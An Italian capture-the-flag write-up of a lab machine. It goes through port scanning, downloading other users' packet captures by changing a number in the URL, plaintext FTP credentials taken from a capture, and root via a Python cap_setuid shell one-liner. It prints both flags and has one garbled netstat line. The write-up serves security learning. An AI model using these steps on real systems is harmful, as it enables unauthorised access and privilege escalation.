@@ -1,0 +1,306 @@
+10.10.10.245
+
+nmap -sC -sV 10.10.10.245
+
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+80/tcp open  http    gunicorn
+
+
+sulla porta 80 c'è una dashboard che logga gli eventi di security
+l'accesso è già effettuato come "nathan"
+
+è possibile anche scaricare un file pcap:
+http://10.10.10.245/data/9 (vuoto) (ogni volta c'è un numero progressivo diverso alla fine)
+
+e visualizzare l'output di due comandi:
+
+http://10.10.10.245/ip (ifconfig)
+
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.245  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 dead:beef::250:56ff:feb9:819a  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::250:56ff:feb9:819a  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:b9:81:9a  txqueuelen 1000  (Ethernet)
+        RX packets 677467  bytes 70148706 (70.1 MB)
+        RX errors 0  dropped 35  overruns 0  frame 0
+        TX packets 713916  bytes 127812603 (127.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 2572  bytes 197184 (197.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 2572  bytes 197184 (197.1 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+
+
+http://10.10.10.245/netstat (netstat)
+
+
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1001       37015      -                    off (0.00/0/0)
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        32541      -                    off (0.00/0/0)
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          35798      -                    off (0.00/0/0)
+tcp        0      0 10.10.10.245:22         10.10.16.21:56982       ESTABLISHED 0          86840      -                    keepalive (6151.91/0/0)
+tcp        0      0 10.10.10.245:80         10.10.14.58:49118       ESTABLISHED 1001       97809      -                    off (0.00/0/0)
+tcp        0      0 10.10.10.245:80         10.10.14.58:49106       TIME_WAIT   0          0          -                    timewait (40.60/0/0)
+tcp        0      0 10.10.10.245:80         10.10.14.58:49110       TIME_WAIT   0          0          -                    timewait (40.60/0/0)
+tcp        0      0 10.10.10.245:80         10.10.14.58:49112       TIME_WAIT   0          0          -                    timewait (41.55/0/0)
+tcp        0      1 10.10.10.245:33062      1.1.1.1:53              SYN_SENT    101        97775      -                    on (6.58/3/0)
+tcp        0      0 10.10.10.245:80         10.10.14.58:49102       TIME_WAIT   0          0          -                    timewait (40.60/0/0)
+tcp        0      0 10.10.10.245:80         10.10.14.58:49108       TIME_WAIT   0          0          -                    timewait (40.60/0/0)
+tcp        0      0 10.10.10.245:80         10.10.14.58:49104       TIME_WAIT   0          0          -                    timewait (40.60/0/0)
+tcp        0      0 10.10.10.245:22         10.10.16.10:58602       ESTABLISHED 0          89236      -                    keepalive (6175.12/0/0)
+tcp6       0      0 :::21                   :::*                    LISTEN      0          34646      -                    off (0.00/0/0)
+tcp6       0      0 :::22                   :::*                    LISTEN      0          35809      -                    off (0.00/0/0)
+tcp6       0      0 10.10.10.245:21         10.10.14.37:51978       ESTABLISHED 0          93264      -                    keepalive (7094.40/0/0)
+udp        0      0 127.0.0.1:52962         127.0.0.53:53           ESTABLISHED 102        97774      -                    off (0.00/0/0)
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        32540      -                    off (0.00/0/0)
+Active UNIX domain sockets (servers and established)
+Proto RefCnt Flags       Type       State         I-Node   PID/Program name     Path
+unix  2      [ ACC ]     SEQPACKET  LISTENING     27051    -                    /run/udev/control
+unix  2      [ ]         DGRAM                    88403    4731/systemd         /run/user/1001/systemd/notify
+unix  2      [ ACC ]     STREAM     LISTENING     88406    4731/systemd         /run/user/1001/systemd/private
+unix  2      [ ACC ]     STREAM     LISTENING     88411    4731/systemd         /run/user/1001/bus
+unix  2      [ ACC ]     STREAM     LISTENING     88412    4731/systemd         /run/user/1001/gnupg/S.dirmngr
+unix  2      [ ACC ]     STREAM     LISTENING     88413    4731/systemd         /run/user/1001/gnupg/S.gpg-agent.browser
+unix  2      [ ACC ]     STREAM     LISTENING     88414    4731/systemd         /run/user/1001/gnupg/S.gpg-agent.extra
+unix  2      [ ACC ]     STREAM     LISTENING     27035    -                    @/org/kernel/linux/storage/multipathd
+unix  2      [ ACC ]     STREAM     LISTENING     88415    4731/systemd         /run/user/1001/gnupg/S.gpg-agent.ssh
+unix  2      [ ACC ]     STREAM     LISTENING     88416    4731/systemd         /run/user/1001/gnupg/S.gpg-agent
+unix  2      [ ACC ]     STREAM     LISTENING     88417    4731/systemd         /run/user/1001/pk-debconf-socket
+unix  2      [ ACC ]     STREAM     LISTENING     88418    4731/systemd         /run/user/1001/snapd-session-agent.socket
+unix  3      [ ]         DGRAM                    27019    -                    /run/systemd/notify
+unix  2      [ ACC ]     STREAM     LISTENING     27022    -                    /run/systemd/private
+unix  2      [ ACC ]     STREAM     LISTENING     27024    -                    /run/systemd/userdb/io.systemd.DynamicUser
+unix  2      [ ACC ]     STREAM     LISTENING     27033    -                    /run/lvm/lvmpolld.socket
+unix  2      [ ]         DGRAM                    27036    -                    /run/systemd/journal/syslog
+unix  10     [ ]         DGRAM                    27044    -                    /run/systemd/journal/dev-log
+unix  2      [ ACC ]     STREAM     LISTENING     27046    -                    /run/systemd/journal/stdout
+unix  9      [ ]         DGRAM                    27048    -                    /run/systemd/journal/socket
+unix  2      [ ACC ]     STREAM     LISTENING     27213    -                    /run/systemd/journal/io.systemd.journal
+unix  2      [ ACC ]     STREAM     LISTENING     31503    -                    /var/run/vmware/guestServicePipe
+unix  2      [ ACC ]     STREAM     LISTENING     31564    -                    /run/dbus/system_bus_socket
+unix  2      [ ACC ]     STREAM     LISTENING     32548    -                    /run/snapd.socket
+unix  2      [ ACC ]     STREAM     LISTENING     32550    -                    /run/snapd-snap.socket
+unix  2      [ ACC ]     STREAM     LISTENING     32552    -                    /run/uuidd/request
+unix  2      [ ACC ]     STREAM     LISTENING     36005    -                    /run/irqbalance//irqbalance1069.sock
+unix  2      [ ACC ]     STREAM     LISTENING     31567    -                    @ISCSIADM_ABSTRACT_NAMESPACE
+unix  2      [ ACC ]     STREAM     LISTENING     31569    -                    /var/snap/lxd/common/lxd/unix.socket
+unix  3      [ ]         STREAM     CONNECTED     36016    -                    
+unix  3      [ ]         STREAM     CONNECTED     27394    -                    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     36991    -                    
+unix  3      [ ]         DGRAM                    28419    -                    
+unix  3      [ ]         STREAM     CONNECTED     36990    -                    
+unix  3      [ ]         STREAM     CONNECTED     31233    -                    
+unix  2      [ ]         DGRAM                    28412    -                    
+unix  3      [ ]         STREAM     CONNECTED     32881    -                    
+unix  3      [ ]         DGRAM                    93888    -                    
+unix  3      [ ]         STREAM     CONNECTED     93980    -                    
+unix  3      [ ]         STREAM     CONNECTED     29454    -                    
+unix  3      [ ]         STREAM     CONNECTED     35477    -                    
+unix  3      [ ]         STREAM     CONNECTED     33607    -                    
+unix  3      [ ]         STREAM     CONNECTED     34516    -                    
+unix  3      [ ]         STREAM     CONNECTED     35480    -                    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     30305    -                    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     30991    -                    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     32883    -                    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     88784    -                    
+unix  3      [ ]         STREAM     CONNECTED     35214    6411/sh              
+unix  3      [ ]         STREAM     CONNECTED     31171    -                    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     35478    -                    
+unix  3      [ ]         STREAM     CONNECTED     27393    -                    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     31236    -                    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     33761    -                    
+unix  3      [ ]         DGRAM                    28418    -                    
+unix  3      [ ]         DGRAM                    28417    -                    
+unix  3      [ ]         DGRAM                    93887    -                    
+unix  2      [ ]         DGRAM                    35476    -                    
+unix  3      [ ]         STREAM     CONNECTED     36987    -                    /run/dbus/system_bus_socket
+unix  2      [ ]         DGRAM                    31249    -                    
+unix  2      [ ]         DGRAM                    35890    -                    
+unix  3      [ ]         STREAM     CONNECTED     95713    -                    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     31568    -                    
+unix  3      [ ]         STREAM     CONNECTED     34521    -                    
+unix  3      [ ]         STREAM     CONNECTED     36986    -                    
+unix  3      [ ]         STREAM     CONNECTED     86904    -                    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     28410    -                    
+unix  3      [ ]         STREAM     CONNECTED     36931    -                    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     88785    -                    
+unix  3      [ ]         STREAM     CONNECTED     88377    4731/systemd         
+unix  3      [ ]         DGRAM                    28416    -                    
+unix  3      [ ]         STREAM     CONNECTED     28345    -                    
+unix  3      [ ]         STREAM     CONNECTED     33762    -                    /run/systemd/journal/stdout
+unix  2      [ ]         DGRAM                    88171    -                    
+unix  3      [ ]         DGRAM                    31554    -                    
+unix  3      [ ]         DGRAM                    88405    4731/systemd         
+unix  3      [ ]         STREAM     CONNECTED     32811    -                    /run/systemd/journal/stdout
+unix  2      [ ]         DGRAM                    88387    -                    
+unix  3      [ ]         STREAM     CONNECTED     32544    -                    
+unix  3      [ ]         DGRAM                    31555    -                    
+unix  3      [ ]         DGRAM                    27021    -                    
+unix  3      [ ]         STREAM     CONNECTED     35682    -                    
+unix  3      [ ]         STREAM     CONNECTED     36026    -                    
+unix  2      [ ]         DGRAM                    98428    -                    
+unix  2      [ ]         STREAM     CONNECTED     87660    -                    
+unix  3      [ ]         STREAM     CONNECTED     35483    -                    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     32888    -                    /run/systemd/journal/stdout
+unix  3      [ ]         DGRAM                    27259    -                    
+unix  3      [ ]         STREAM     CONNECTED     32066    -                    
+unix  3      [ ]         STREAM     CONNECTED     32068    -                    
+unix  3      [ ]         STREAM     CONNECTED     88407    4731/systemd         
+unix  3      [ ]         STREAM     CONNECTED     33385    -                    /run/systemd/journal/stdout
+unix  3      [ ]         DGRAM                    31553    -                    
+unix  2      [ ]         DGRAM                    27347    -                    
+unix  3      [ ]         DGRAM                    31552    -                    
+unix  2      [ ]         DGRAM                    32535    -                    
+unix  3      [ ]         STREAM     CONNECTED     88527    -                    
+unix  3      [ ]         STREAM     CONNECTED     35217    -                    /run/systemd/journal/stdout
+unix  2      [ ]         DGRAM                    36439    -                    
+unix  3      [ ]         STREAM     CONNECTED     33459    -                    /run/systemd/journal/stdout
+unix  2      [ ]         DGRAM                    88613    -                    
+unix  3      [ ]         STREAM     CONNECTED     33609    -                    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     35482    -                    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     35211    -                    /run/systemd/journal/stdout
+unix  2      [ ]         DGRAM                    27256    -                    
+unix  3      [ ]         DGRAM                    88404    4731/systemd         
+unix  3      [ ]         STREAM     CONNECTED     32643    -                    
+unix  3      [ ]         STREAM     CONNECTED     35481    -                    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     97006    -                    
+unix  3      [ ]         STREAM     CONNECTED     36954    -                    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     30990    -                    /run/systemd/journadirb http://10.10.10.245/
+l/stdout
+unix  3      [ ]         STREAM     CONNECTED     97005    -                    
+unix  2      [ ]         DGRAM                    27217    -                    
+unix  3      [ ]         STREAM     CONNECTED     32638    -                    
+unix  2      [ ]         DGRAM                    88396    4731/systemd         
+unix  2      [ ]         DGRAM                    36019    -                    
+unix  3      [ ]         STREAM     CONNECTED     33814    -                    
+unix  3      [ ]         STREAM     CONNECTED     32137    -                    
+unix  3      [ ]         STREAM     CONNECTED     86928    -                    /run/dbus/system_bus_socket
+unix  2      [ ]         STREAM     CONNECTED     88549    -                    
+unix  2      [ ]         DGRAM                    31549    -                    
+unix  2      [ ]         DGRAM                    33819    -                    
+unix  3      [ ]         STREAM     CONNECTED     35479    -                    /run/dbus/system_bus_socket
+unix  3      [ ]         DGRAM                    27020    -                    
+unix  3      [ ]         STREAM     CONNECTED     35683    -                    /run/systemd/journal/stdout
+unix  3      [ ]         DGRAM                    27258    -                    
+unix  3      [ ]         STREAM     CONNECTED     33809    -                    
+unix  3      [ ]         STREAM     CONNECTED     31570    -                    
+unix  3      [ ]         STREAM     CONNECTED     35210    -                    
+unix  3      [ ]         STREAM     CONNECTED     88528    -
+
+
+
+per ottenere un pcap non vuoto basta fare delle richieste mentre viene generato (5 secondi) (mostra sempre quello proveniente dal proprio ip)
+ad esempio eseguendo un fuzzing nel frattempo:
+
+dirb http://10.10.10.245/
+
+
+--- Scanning URL: http://10.10.10.245/ ----
++ http://10.10.10.245/data (CODE:302|SIZE:208)                                                                                                                                                                                              
++ http://10.10.10.245/ip (CODE:200|SIZE:17461)                                                                                                                                                                                              
++ http://10.10.10.245/netstat (CODE:200|SIZE:31653)  
+
+
+
+inoltre si possono facilmente trovare altri pcap  variando i numeri dopo /data:
+
+http://10.10.10.245/data/0
+http://10.10.10.245/data/2
+http://10.10.10.245/data/3
+
+
+il pcap 0 sembra piu interessante perchè sembra essere stato creato come test, infatti gli indirizzi all'interno sono 192.168.1.*, quindi di una comunicazione interna
+infatti all'interno è possibile provare anche le prove fatte con ftp e in particolare è possibile trovare user e password per accedere al servizio:
+
+nathan:Buck3tH4TF0RM3!
+
+ftp 10.10.10.245
+Connected to 10.10.10.245.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.245:daerves): nathan
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+
+ftp> pwd
+257 "/home/nathan" is the current directory
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-r--------    1 1001     1001           33 Aug 28 11:39 user.txt
+226 Directory send OK.
+
+
+user:
+c599649c29c01dccdef69c6e607218c1
+
+
+con la stessa pwd è possibile fare il login tramite ssh
+
+sudo -l
+[sudo] password for nathan: 
+Sorry, user nathan may not run sudo on cap.
+
+
+usando il cmando getcap https://man7.org/linux/man-pages/man8/getcap.8.html trovo file su cui ci sono permessi particolari per l'utente:
+
+getcap -r / 2>/dev/null
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+
+su python c'è la possibilità di usare cap_setuid:
+
+Capabilities
+
+If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
+
+    cp $(which python) .
+    sudo setcap cap_setuid+ep python
+
+    ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+    
+
+
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# id
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+# cat root.txt
+41c00ca9e8475663de06a7bbb5438b58
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
